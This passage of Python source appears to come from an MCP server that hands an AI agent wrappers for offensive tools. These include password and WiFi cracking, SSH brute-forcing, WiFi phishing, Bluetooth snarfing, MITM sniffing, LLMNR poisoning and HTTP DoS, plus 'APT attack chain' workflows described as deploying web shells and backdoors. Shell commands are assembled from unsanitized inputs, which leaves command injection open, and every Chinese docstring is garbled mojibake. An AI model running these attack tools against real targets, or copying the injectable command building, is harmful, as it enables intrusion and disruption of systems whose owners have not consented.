            HTTP probing results
        """
        cmd = f"echo '{targets}' | httpx {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def masscan_fast_scan(target: str, ports: str = "80,443,22,21,25,53,110,143,993,995,8080,8443",
                          rate: str = "10000", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Masscan for ultra-fast port scanning.

        Args:
            target: Target IP or network range
            ports: Ports to scan (comma-separated or range)
            rate: Scan rate (packets per second)
            additional_args: Additional Masscan arguments

        Returns:
            Fast port scan results
        """
        cmd = f"masscan {target} -p{ports} --rate={rate} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def hashcat_crack(hash_file: str, attack_mode: str = "0",
                      wordlist: str = "/usr/share/wordlists/rockyou.txt",
                      hash_type: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Hashcat for GPU-accelerated password cracking.

        Args:
            hash_file: File containing hashes to crack
            attack_mode: Attack mode (0=dictionary, 1=combinator, 3=brute-force)
            wordlist: Wordlist file for dictionary attacks
            hash_type: Hash type (-m parameter)
            additional_args: Additional Hashcat arguments

        Returns:
            Password cracking results
        """
        cmd = f"hashcat -a {attack_mode}"
        if hash_type:
            cmd += f" -m {hash_type}"
        cmd += f" {hash_file} {wordlist} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def searchsploit_search(term: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Search exploit database using searchsploit.

        Args:
            term: Search term (software, version, CVE, etc.)
            additional_args: Additional searchsploit arguments

        Returns:
            Exploit search results
        """
        cmd = f"searchsploit {term} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def aircrack_attack(capture_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                        bssid: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Aircrack-ng for WiFi password cracking.

        Args:
            capture_file: Path to capture file (.cap or .pcap)
            wordlist: Wordlist for dictionary attack
            bssid: Target BSSID (optional)
            additional_args: Additional Aircrack-ng arguments

        Returns:
            WiFi cracking results
        """
        cmd = f"aircrack-ng {capture_file} -w {wordlist}"
        if bssid:
            cmd += f" -b {bssid}"
        cmd += f" {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def comprehensive_recon(target: str, domain_enum: bool = True,
                           port_scan: bool = True, web_scan: bool = True) -> Dict[str, Any]:
        """
        Execute comprehensive reconnaissance workflow using multiple tools.

        Args:
            target: Target domain or IP
            domain_enum: Whether to perform subdomain enumeration
            port_scan: Whether to perform port scanning
            web_scan: Whether to perform web application scanning

        Returns:
            Comprehensive reconnaissance results
        """
        from datetime import datetime

        results = {
            "target": target,
            "workflow": "comprehensive_recon",
            "start_time": datetime.now().isoformat(),
            "phases": {}
        }

        try:
            # Phase 1: Subdomain enumeration
            if domain_enum and not target.replace(".", "").replace("/", "").isdigit():
                logger.info(f"Phase 1: Subdomain enumeration for {target}")
                results["phases"]["1_subdomain_enum"] = {
                    "subfinder": subfinder_scan(target),
                    "amass": amass_enum(target, "enum", "-passive"),
                    "sublist3r": executor.execute_command(f"sublist3r -d {target}")
                }

            # Phase 2: Port scanning
            if port_scan:
                logger.info(f"Phase 2: Port scanning for {target}")
                results["phases"]["2_port_scan"] = {
                    "masscan": masscan_fast_scan(target),
                    "nmap": nmap_scan(target, "-sV -sC", "", "-T4")
                }

            # Phase 3: Web application scanning
            if web_scan:
                logger.info(f"Phase 3: Web application scanning for {target}")
                target_url = target if target.startswith("http") else f"http://{target}"
                results["phases"]["3_web_scan"] = {
                    "whatweb": whatweb_scan(target_url),
                    "httpx": httpx_probe(target_url, "-tech-detect -status-code"),
                    "nuclei": nuclei_scan(target_url, "http/", "critical,high")
                }

            results["success"] = True
            results["end_time"] = datetime.now().isoformat()

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)
            logger.error(f"Comprehensive recon failed: {e}")

        return results

    # ====================  æ–°å¢å·¥å…·å‡½æ•° ====================
    
    # æ ¸å¿ƒæ‰«æå·¥å…·
    @mcp.tool()
    def zmap_scan(target: str, port: str = "80", rate: str = "10000", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Zmap network scanner.
        
        Args:
            target: Target network or IP range
            port: Port to scan (default: 80)
            rate: Scan rate (default: 10000)
            additional_args: Additional Zmap arguments
            
        Returns:
            Zmap scan results
        """
        data = {
            "target": target,
            "port": port,
            "rate": rate,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("zmap", data)

    # ç›®å½•å’ŒWebæ‰«æå·¥å…·
    @mcp.tool()
    def feroxbuster_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                        threads: str = "50", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute feroxbuster directory scanner.
        
        Args:
            url: Target URL
            wordlist: Path to wordlist file
            threads: Number of concurrent threads
            additional_args: Additional feroxbuster arguments
            
        Returns:
            Feroxbuster scan results
        """
        data = {
            "url": url,
            "wordlist": wordlist,
            "threads": threads,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("feroxbuster", data)

    # DNSæšä¸¾å·¥å…·
    @mcp.tool()
    def dnsenum_scan(domain: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute dnsenum for DNS enumeration.
        
        Args:
            domain: Target domain
            additional_args: Additional dnsenum arguments
            
        Returns:
            DNS enumeration results
        """
        data = {
            "domain": domain,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dnsenum", data)

    @mcp.tool()
    def fierce_scan(domain: str, threads: str = "10", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute fierce DNS scanner.
        
        Args:
            domain: Target domain
            threads: Number of threads
            additional_args: Additional fierce arguments
            
        Returns:
            Fierce scan results
        """
        data = {
            "domain": domain,
            "threads": threads,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("fierce", data)

    @mcp.tool()
    def dnsmap_scan(domain: str, wordlist: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute dnsmap for DNS mapping.
        
        Args:
            domain: Target domain
            wordlist: Path to wordlist file
            additional_args: Additional dnsmap arguments
            
        Returns:
            DNS mapping results
        """
        data = {
            "domain": domain,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dnsmap", data)


    # Webæ¼æ´æ‰«æå·¥å…·
    @mcp.tool()
    def joomscan_scan(target: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute joomscan for Joomla security testing.
        
        Args:
            target: Target Joomla URL
            additional_args: Additional joomscan arguments
            
        Returns:
            Joomla scan results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("joomscan", data)

    # å¯†ç æ”»å‡»å·¥å…·
    @mcp.tool()
    def ncrack_attack(target: str, service: str = "ssh", username_file: str = "",
                     password_file: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute ncrack for network authentication cracking.
        
        Args:
            target: Target host
            service: Service to attack
            username_file: Path to username file
            password_file: Path to password file
            additional_args: Additional ncrack arguments
            
        Returns:
            Network cracking results
        """
        data = {
            "target": target,
            "service": service,
            "username_file": username_file,
            "password_file": password_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("ncrack", data)

    @mcp.tool()
    def patator_attack(module: str = "ssh_login", target: str = "", wordlist: str = "",
                      additional_args: str = "") -> Dict[str, Any]:
        """
        Execute patator for multi-protocol brute-forcing.
        
        Args:
            module: Patator module to use
            target: Target host
            wordlist: Path to wordlist file
            additional_args: Additional patator arguments
            
        Returns:
            Brute force attack results
        """
        data = {
            "module": module,
            "target": target,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("patator", data)

    @mcp.tool()
    def crowbar_attack(service: str = "ssh", target: str = "", username: str = "",
                      wordlist: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute crowbar for brute force attacks.
        
        Args:
            service: Service to attack
            target: Target host
            username: Username to test
            wordlist: Path to wordlist file
            additional_args: Additional crowbar arguments
            
        Returns:
            Brute force attack results
        """
        data = {
            "service": service,
            "target": target,
            "username": username,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("crowbar", data)

    @mcp.tool()
    def brutespray_attack(nmap_file: str, username_file: str = "", password_file: str = "",
                         threads: str = "5", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute brutespray for brute force attacks from nmap output.
        
        Args:
            nmap_file: Path to nmap XML output file
            username_file: Path to username file
            password_file: Path to password file
            threads: Number of threads
            additional_args: Additional brutespray arguments
            
        Returns:
            Brute force attack results
        """
        data = {
            "nmap_file": nmap_file,
            "username_file": username_file,
            "password_file": password_file,
            "threads": threads,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("brutespray", data)

    # ç½‘ç»œå‘ç°å·¥å…·
    @mcp.tool()
    def arp_scan(interface: str = "", network: str = "--local", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute arp-scan for network discovery.
        
        Args:
            interface: Network interface to use
            network: Network to scan
            additional_args: Additional arp-scan arguments
            
        Returns:
            ARP scan results
        """
        data = {
            "interface": interface,
            "network": network,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("arp-scan", data)

    @mcp.tool()
    def fping_scan(targets: str, count: str = "3", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute fping for fast ping sweeps.
        
        Args:
            targets: Target hosts or networks
            count: Number of ping packets
            additional_args: Additional fping arguments
            
        Returns:
            Ping sweep results
        """
        data = {
            "targets": targets,
            "count": count,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("fping", data)

    # æ— çº¿å®‰å…¨å·¥å…·
    @mcp.tool()
    def bully_attack(interface: str, bssid: str, additional_args: str = "-v") -> Dict[str, Any]:
        """
        Execute bully for WPS attacks.
        
        Args:
            interface: Wireless interface
            bssid: Target AP BSSID
            additional_args: Additional bully arguments
            
        Returns:
            WPS attack results
        """
        data = {
            "interface": interface,
            "bssid": bssid,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("bully", data)

    @mcp.tool()
    def pixiewps_attack(pke: str, pkr: str, e_hash1: str, e_hash2: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute pixiewps for WPS PIN recovery.
        
        Args:
            pke: Public Key E
            pkr: Public Key R
            e_hash1: E-Hash1
            e_hash2: E-Hash2
            additional_args: Additional pixiewps arguments
            
        Returns:
            WPS PIN recovery results
        """
        data = {
            "pke": pke,
            "pkr": pkr,
            "e_hash1": e_hash1,
            "e_hash2": e_hash2,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("pixiewps", data)

    @mcp.tool()
    def wifiphisher_attack(interface: str, essid: str = "", phishing_scenario: str = "firmware-upgrade",
                          additional_args: str = "") -> Dict[str, Any]:
        """
        Execute wifiphisher for WiFi phishing attacks.
        
        Args:
            interface: Wireless interface
            essid: Target network ESSID
            phishing_scenario: Phishing scenario to use
            additional_args: Additional wifiphisher arguments
            
        Returns:
            WiFi phishing attack results
        """
        data = {
            "interface": interface,
            "essid": essid,
            "phishing_scenario": phishing_scenario,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wifiphisher", data)

    # è“ç‰™å·¥å…·
    @mcp.tool()
    def bluesnarfer_attack(target_mac: str, action: str = "info", channel: str = "1",
                          additional_args: str = "") -> Dict[str, Any]:
        """
        Execute bluesnarfer for Bluetooth attacks.
        
        Args:
            target_mac: Target Bluetooth MAC address
            action: Action to perform (info, backup)
            channel: Bluetooth channel
            additional_args: Additional bluesnarfer arguments
            
        Returns:
            Bluetooth attack results
        """
        data = {
            "target_mac": target_mac,
            "action": action,
            "channel": channel,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("bluesnarfer", data)

    @mcp.tool()
    def btscanner_scan(output_file: str = "/tmp/btscanner.xml", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute btscanner for Bluetooth device discovery.
        
        Args:
            output_file: Output file path
            additional_args: Additional btscanner arguments
            
        Returns:
            Bluetooth scan results
        """
        data = {
            "output_file": output_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("btscanner", data)

    # ç½‘ç»œæ”»å‡»å·¥å…·
    @mcp.tool()
    def ettercap_attack(interface: str, target1: str = "", target2: str = "",
                       filter_file: str = "", additional_args: str = "-T") -> Dict[str, Any]:
        """
        Execute ettercap for network sniffing and MITM attacks.
        
        Args:
            interface: Network interface
            target1: First target IP
            target2: Second target IP
            filter_file: Ettercap filter file
            additional_args: Additional ettercap arguments
            
        Returns:
            Network attack results
        """
        data = {
            "interface": interface,
            "target1": target1,
            "target2": target2,
            "filter_file": filter_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("ettercap", data)

    @mcp.tool()
    def responder_attack(interface: str, analyze_mode: bool = False, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Responder for LLMNR/NBT-NS poisoning.
        
        Args:
            interface: Network interface
            analyze_mode: Enable analyze mode
            additional_args: Additional responder arguments
            
        Returns:
            LLMNR/NBT-NS poisoning results
        """
        data = {
            "interface": interface,
            "analyze_mode": analyze_mode,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("responder", data)

    @mcp.tool()
    def dsniff_sniff(interface: str = "", filter_expr: str = "", output_file: str = "",
                    additional_args: str = "") -> Dict[str, Any]:
        """
        Execute dsniff for network sniffing.
        
        Args:
            interface: Network interface
            filter_expr: BPF filter expression
            output_file: Output file path
            additional_args: Additional dsniff arguments
            
        Returns:
            Network sniffing results
        """
        data = {
            "interface": interface,
            "filter": filter_expr,
            "output_file": output_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dsniff", data)

    @mcp.tool()
    def ngrep_search(pattern: str = "", interface: str = "", filter_expr: str = "",
                    additional_args: str = "") -> Dict[str, Any]:
        """
        Execute ngrep for network grep.
        
        Args:
            pattern: Search pattern
            interface: Network interface
            filter_expr: BPF filter expression
            additional_args: Additional ngrep arguments
            
        Returns:
            Network grep results
        """
        data = {
            "pattern": pattern,
            "interface": interface,
            "filter": filter_expr,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("ngrep", data)

    @mcp.tool()
    def tshark_capture(interface: str = "", capture_filter: str = "", display_filter: str = "",
                      output_file: str = "", packet_count: str = "100", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute tshark for network analysis.
        
        Args:
            interface: Network interface
            capture_filter: Capture filter
            display_filter: Display filter
            output_file: Output file path
            packet_count: Number of packets to capture
            additional_args: Additional tshark arguments
            
        Returns:
            Network analysis results
        """
        data = {
            "interface": interface,
            "capture_filter": capture_filter,
            "display_filter": display_filter,
            "output_file": output_file,
            "packet_count": packet_count,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("tshark", data)

    # DoSå·¥å…·
    @mcp.tool()
    def slowhttptest_dos(target: str, attack_type: str = "slowloris", connections: str = "200",
                        timeout: str = "240", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute slowhttptest for HTTP DoS testing.
        
        Args:
            target: Target URL
            attack_type: Type of attack (slowloris, slow_post, slow_read)
            connections: Number of connections
            timeout: Connection timeout
            additional_args: Additional slowhttptest arguments
            
        Returns:
            HTTP DoS test results
        """
        data = {
            "target": target,
            "attack_type": attack_type,
            "connections": connections,
            "timeout": timeout,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("slowhttptest", data)

    # åæ¸—é€å·¥å…·
    @mcp.tool()
    def armitage_start(additional_args: str = "") -> Dict[str, Any]:
        """
        Execute armitage GUI (note: this will start the GUI).
        
        Args:
            additional_args: Additional armitage arguments
            
        Returns:
            Armitage startup results
        """
        data = {
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("armitage", data)

    # ä¿¡æ¯æ”¶é›†å·¥å…·
    @mcp.tool()
    def recon_ng_run(workspace: str = "default", module: str = "", options: Dict[str, str] = {},
                    additional_args: str = "") -> Dict[str, Any]:
        """
        Execute recon-ng for reconnaissance.
        
        Args:
            workspace: Recon-ng workspace
            module: Module to execute
            options: Module options
            additional_args: Additional recon-ng arguments
            
        Returns:
            Reconnaissance results
        """
        data = {
            "workspace": workspace,
            "module": module,
            "options": options,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("recon-ng", data)

    @mcp.tool()
    def sherlock_search(username: str, sites: str = "", output_format: str = "json",
                       additional_args: str = "") -> Dict[str, Any]:
        """
        Execute sherlock for username enumeration across social networks.
        
        Args:
            username: Username to search for
            sites: Specific sites to search
            output_format: Output format
            additional_args: Additional sherlock arguments
            
        Returns:
            Username enumeration results
        """
        data = {
            "username": username,
            "sites": sites,
            "output_format": output_format,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("sherlock", data)

    @mcp.tool()
    def whatweb_identify(target: str, aggression: str = "1", output_format: str = "json",
                        additional_args: str = "") -> Dict[str, Any]:
        """
        Execute whatweb for web technology identification.
        
        Args:
            target: Target URL or IP
            aggression: Aggression level (1-4)
            output_format: Output format
            additional_args: Additional whatweb arguments
            
        Returns:
            Web technology identification results
        """
        data = {
            "target": target,
            "aggression": aggression,
            "output_format": output_format,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("whatweb", data)

    # ç½‘ç»œæ”»å‡»å·¥å…·
    @mcp.tool()
    def yersinia_attack(protocol: str = "stp", interface: str = "", attack_type: str = "",
                       additional_args: str = "") -> Dict[str, Any]:
        """
        Execute yersinia for network protocol attacks.
        
        Args:
            protocol: Protocol to attack (stp, cdp, dtp, etc.)
            interface: Network interface
            attack_type: Type of attack
            additional_args: Additional yersinia arguments
            
        Returns:
            Network protocol attack results
        """
        data = {
            "protocol": protocol,
            "interface": interface,
            "attack_type": attack_type,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("yersinia", data)

    # ==================== å¹¶å‘ä»»åŠ¡ç®¡ç†MCPå·¥å…· ====================
    
    @mcp.tool()
    def submit_concurrent_task(tool_name: str, parameters: Dict[str, Any],
                             priority: int = 2, timeout: Optional[int] = None,
                             tags: Optional[List[str]] = None,
                             metadata: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        æäº¤å¹¶å‘ä»»åŠ¡ã€‚
        
        Args:
            tool_name: å·¥å…·åç§°
            parameters: å·¥å…·å‚æ•°
            priority: ä»»åŠ¡ä¼˜å…ˆçº§ (1=ä½, 2=æ™®é€š, 3=é«˜, 4=ç´§æ€¥)
            timeout: è¶…æ—¶æ—¶é—´(ç§’)
            tags: ä»»åŠ¡æ ‡ç­¾
            metadata: å…ƒæ•°æ®
            
        Returns:
            ä»»åŠ¡æäº¤ç»“æœ
        """
        data = {
            "tool_name": tool_name,
            "parameters": parameters,
            "priority": priority,
            "timeout": timeout,
            "tags": tags or [],
            "metadata": metadata or {}
        }
        return executor.execute_tool_with_data("submit_task", data)

    @mcp.tool()
    def submit_workflow(workflow_name: str, target: str, 
                       workflow_type: str = "comprehensive_web_scan") -> Dict[str, Any]:
        """
        æäº¤é¢„å®šä¹‰å·¥ä½œæµã€‚
        
        Args:
            workflow_name: å·¥ä½œæµåç§°
            target: ç›®æ ‡åœ°å€æˆ–åŸŸå
            workflow_type: å·¥ä½œæµç±»å‹
                - "comprehensive_web_scan": å…¨é¢Webæ‰«æ
                - "network_penetration_test": ç½‘ç»œæ¸—é€æµ‹è¯•
                - "fast_reconnaissance": å¿«é€Ÿä¾¦å¯Ÿ
                
        Returns:
            å·¥ä½œæµæäº¤ç»“æœ
        """
        data = {
            "workflow_name": workflow_name,
            "target": target,
            "workflow_type": workflow_type
        }
        return executor.execute_tool_with_data("submit_workflow", data)

    @mcp.tool()
    def get_task_status(task_id: str) -> Dict[str, Any]:
        """
        è·å–ä»»åŠ¡çŠ¶æ€ã€‚
        
        Args:
            task_id: ä»»åŠ¡ID
            
        Returns:
            ä»»åŠ¡çŠ¶æ€ä¿¡æ¯
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}
    
    @mcp.tool()
    def get_workflow_status(workflow_id: str) -> Dict[str, Any]:
        """
        è·å–å·¥ä½œæµçŠ¶æ€ã€‚
        
        Args:
            workflow_id: å·¥ä½œæµID
            
        Returns:
            å·¥ä½œæµçŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…å«æ‰€æœ‰ä»»åŠ¡çš„è¯¦ç»†çŠ¶æ€
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}
    
    @mcp.tool()
    def get_concurrent_system_stats() -> Dict[str, Any]:
        """
        è·å–å¹¶å‘ä»»åŠ¡ç³»ç»Ÿç»Ÿè®¡ä¿¡æ¯ã€‚
        
        Returns:
            ç³»ç»Ÿç»Ÿè®¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»»åŠ¡æ•°é‡ã€é˜Ÿåˆ—çŠ¶æ€ç­‰
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}
    
    @mcp.tool()
    def comprehensive_web_security_scan(target: str, workflow_name: str = "Web Security Assessment") -> Dict[str, Any]:
        """
        æ‰§è¡Œå…¨é¢çš„Webå®‰å…¨è¯„ä¼°å·¥ä½œæµã€‚
        
        è¯¥å·¥ä½œæµåŒ…æ‹¬ï¼š
        1. æŠ€æœ¯æ£€æµ‹ (whatweb)
        2. ç›®å½•æ‰«æ (gobuster)
        3. WebæœåŠ¡å™¨æ‰«æ (nikto)
        4. æ¼æ´æ‰«æ (nuclei)
        
        Args:
            target: ç›®æ ‡Webåº”ç”¨URL
            workflow_name: å·¥ä½œæµåç§°
            
        Returns:
            å·¥ä½œæµæäº¤ç»“æœ
        """
        return submit_workflow(
            workflow_name=workflow_name,
            target=target,
            workflow_type="comprehensive_web_scan"
        )
    
    @mcp.tool()
    def network_penetration_testing(target: str, workflow_name: str = "Network Penetration Test") -> Dict[str, Any]:
        """
        æ‰§è¡Œç½‘ç»œæ¸—é€æµ‹è¯•å·¥ä½œæµã€‚
        
        è¯¥å·¥ä½œæµåŒ…æ‹¬ï¼š
        1. ç«¯å£æ‰«æ (nmap)
        2. ç½‘ç»œæ¼æ´æ‰«æ (nuclei)
        
        Args:
            target: ç›®æ ‡IPåœ°å€æˆ–ç½‘ç»œèŒƒå›´
            workflow_name: å·¥ä½œæµåç§°
            
        Returns:
            å·¥ä½œæµæäº¤ç»“æœ
        """
        return submit_workflow(
            workflow_name=workflow_name,
            target=target,
            workflow_type="network_penetration_test"
        )
    
    @mcp.tool()
    def fast_reconnaissance(target: str, workflow_name: str = "Fast Reconnaissance") -> Dict[str, Any]:
        """
        æ‰§è¡Œå¿«é€Ÿä¾¦å¯Ÿå·¥ä½œæµã€‚
        
        è¯¥å·¥ä½œæµåŒ…æ‹¬ï¼š
        1. å¿«é€Ÿç«¯å£æ‰«æ (masscan)
        2. å­åŸŸåæšä¸¾ (subfinder)
        
        Args:
            target: ç›®æ ‡åŸŸåæˆ–IPåœ°å€
            workflow_name: å·¥ä½œæµåç§°
            
        Returns:
            å·¥ä½œæµæäº¤ç»“æœ
        """
        return submit_workflow(
            workflow_name=workflow_name,
            target=target,
            workflow_type="fast_reconnaissance"
        )
    
    @mcp.tool()
    def parallel_port_scanning(targets: List[str], ports: str = "1-1000",
                             scan_type: str = "-sS", priority: int = 3) -> Dict[str, Any]:
        """
        å¹¶è¡Œæ‰§è¡Œå¤šä¸ªç›®æ ‡çš„ç«¯å£æ‰«æã€‚
        
        Args:
            targets: ç›®æ ‡åˆ—è¡¨
            ports: ç«¯å£èŒƒå›´
            scan_type: æ‰«æç±»å‹
            priority: ä»»åŠ¡ä¼˜å…ˆçº§
            
        Returns:
            æ‰€æœ‰æäº¤çš„ä»»åŠ¡IDåˆ—è¡¨
        """
        task_ids = []
        for target in targets:
            result = submit_concurrent_task(
                tool_name="nmap",
                parameters={
                    "target": target,
                    "scan_type": scan_type,
                    "ports": ports,
                    "additional_args": "-T4 --open"
                },
                priority=priority,
                timeout=600,
                tags=["port_scan", "parallel"],
                metadata={"batch_scan": True, "target_count": len(targets)}
            )
            if result.get("success"):
                task_ids.append(result.get("task_id"))
        
        return {
            "success": True,
            "task_ids": task_ids,
            "total_tasks": len(task_ids),
            "message": f"Submitted {len(task_ids)} parallel port scanning tasks"
        }
    
    @mcp.tool()
    def parallel_directory_scanning(urls: List[str], wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                                  priority: int = 2) -> Dict[str, Any]:
        """
        å¹¶è¡Œæ‰§è¡Œå¤šä¸ªç›®æ ‡çš„ç›®å½•æ‰«æã€‚
        
        Args:
            urls: ç›®æ ‡URLåˆ—è¡¨
            wordlist: å­—å…¸æ–‡ä»¶è·¯å¾„
            priority: ä»»åŠ¡ä¼˜å…ˆçº§
            
        Returns:
            æ‰€æœ‰æäº¤çš„ä»»åŠ¡IDåˆ—è¡¨
        """
        task_ids = []
        for url in urls:
            result = submit_concurrent_task(
                tool_name="gobuster",
                parameters={
                    "url": url,
                    "mode": "dir",
                    "wordlist": wordlist,
                    "additional_args": "-t 20 -x php,html,txt,js"
                },
                priority=priority,
                timeout=300,
                tags=["directory_scan", "parallel"],
                metadata={"batch_scan": True, "target_count": len(urls)}
            )
            if result.get("success"):
                task_ids.append(result.get("task_id"))
        
        return {
            "success": True,
            "task_ids": task_ids,
            "total_tasks": len(task_ids),
            "message": f"Submitted {len(task_ids)} parallel directory scanning tasks"
        }

    # ==================== APTæ”»å‡»é“¾å·¥å…· ====================

    @mcp.tool()
    def submit_apt_attack_chain(target: str, target_info: Dict[str, Any] = None,
                               attack_objective: str = "full_compromise") -> Dict[str, Any]:
        """
        æäº¤APTæ”»å‡»é“¾å·¥ä½œæµ - åŸºäºçŸ¥è¯†å›¾è°±çš„æ™ºèƒ½åŒ–å¹¶å‘æ”»å‡»ã€‚

        Args:
            target: ç›®æ ‡IPåœ°å€æˆ–åŸŸå
            target_info: ç›®æ ‡ä¿¡æ¯ï¼ˆç«¯å£ã€æœåŠ¡ç­‰ï¼‰ï¼Œå¦‚æœä¸ºç©ºåˆ™è‡ªåŠ¨ä¾¦å¯Ÿ
            attack_objective: æ”»å‡»ç›®æ ‡ï¼ˆfull_compromise, data_extraction, persistenceç­‰ï¼‰

        Returns:
            APTæ”»å‡»é“¾å·¥ä½œæµIDå’ŒçŠ¶æ€
        """
        data = {
            "target": target,
            "target_info": target_info,
            "attack_objective": attack_objective
        }
        return executor.execute_tool_with_data("apt_attack_chain", data)

    @mcp.tool()
    def identify_attack_surfaces(target_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        åŸºäºç›®æ ‡ä¿¡æ¯è¯†åˆ«æ”»å‡»é¢ã€‚

        Args:
            target_info: ç›®æ ‡ä¿¡æ¯ï¼ŒåŒ…å«ç«¯å£ã€æœåŠ¡ã€ç‰ˆæœ¬ç­‰

        Returns:
            è¯†åˆ«åˆ°çš„æ”»å‡»é¢åˆ—è¡¨
        """
        data = {"target_info": target_info}
        return executor.execute_tool_with_data("identify_attack_surfaces", data)

    @mcp.tool()
    def generate_attack_paths(target: str, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        ç”Ÿæˆé’ˆå¯¹ç›®æ ‡çš„APTæ”»å‡»è·¯å¾„ã€‚

        Args:
            target: ç›®æ ‡IPåœ°å€æˆ–åŸŸå
            target_info: ç›®æ ‡ä¿¡æ¯ï¼ŒåŒ…å«ç«¯å£ã€æœåŠ¡ã€ç‰ˆæœ¬ç­‰

        Returns:
            ç”Ÿæˆçš„æ”»å‡»è·¯å¾„åˆ—è¡¨ï¼ŒåŒ…å«å¹¶å‘æ‰§è¡Œå±‚å’ŒæˆåŠŸæ¦‚ç‡
        """
        data = {
            "target": target,
            "target_info": target_info
        }
        return executor.execute_tool_with_data("generate_attack_paths", data)

    @mcp.tool()
    def apt_web_application_attack(target: str) -> Dict[str, Any]:
        """
        æ‰§è¡ŒAPT Webåº”ç”¨æ”»å‡»é“¾ - è‡ªåŠ¨åŒ–å¤šé˜¶æ®µWebåº”ç”¨æ¸—é€ã€‚

        åŒ…å«æ”»å‡»é˜¶æ®µï¼š
        1. ä¾¦å¯Ÿï¼šç«¯å£æ‰«æã€æŠ€æœ¯è¯†åˆ«ã€ç›®å½•å‘ç°
        2. åˆå§‹è®¿é—®ï¼šSQLæ³¨å…¥ã€æ–‡ä»¶ä¸Šä¼ ã€è®¤è¯ç»•è¿‡
        3. æ‰§è¡Œï¼šWeb Shelléƒ¨ç½²ã€å‘½ä»¤æ‰§è¡Œ
        4. æŒä¹…åŒ–ï¼šåé—¨æ¤å…¥ã€æƒé™ç»´æŒ

        Args:
            target: ç›®æ ‡Webåº”ç”¨URLæˆ–IP

        Returns:
            APT Webæ”»å‡»é“¾æ‰§è¡Œç»“æœ
        """
        # æ„é€ Webåº”ç”¨ç›®æ ‡ä¿¡æ¯
        target_info = {
            "ports": [
                {"port": 80, "service": "http"},
                {"port": 443, "service": "https"}
            ]
        }

        return submit_apt_attack_chain(target, target_info, "web_compromise")

    @mcp.tool()
    def apt_network_penetration(target: str) -> Dict[str, Any]:
        """
        æ‰§è¡ŒAPTç½‘ç»œæ¸—é€æ”»å‡»é“¾ - è‡ªåŠ¨åŒ–å¤šé˜¶æ®µç½‘ç»œæ¸—é€æµ‹è¯•ã€‚

        åŒ…å«æ”»å‡»é˜¶æ®µï¼š
        1. ä¾¦å¯Ÿï¼šç½‘ç»œæ‰«æã€æœåŠ¡æšä¸¾ã€æ¼æ´è¯†åˆ«
        2. åˆå§‹è®¿é—®ï¼šæœåŠ¡æ¼æ´åˆ©ç”¨ã€æš´åŠ›ç ´è§£
